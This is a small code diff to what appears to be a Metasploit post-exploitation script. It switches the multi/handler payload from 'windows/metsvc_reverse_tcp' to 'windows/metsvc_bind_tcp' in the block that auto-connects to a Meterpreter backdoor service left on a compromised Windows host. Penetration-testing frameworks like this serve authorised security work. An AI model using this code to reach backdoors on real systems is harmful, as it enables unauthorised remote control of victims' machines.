@@ -106,7 +106,7 @@ end
 if(autoconn)
 	print_status("Trying to connect to the Meterpreter service at #{client.tunnel_peer.split(':')[0]}:#{rport}...")
 	mul = client.framework.exploits.create("multi/handler")
-	mul.datastore['PAYLOAD'] = "windows/metsvc_reverse_tcp"
+	mul.datastore['PAYLOAD'] = "windows/metsvc_bind_tcp"
 	mul.datastore['LPORT']   = rport
 	mul.datastore['RHOST']   = client.tunnel_peer.split(':')[0]
 	mul.datastore['ExitOnSession'] = false	
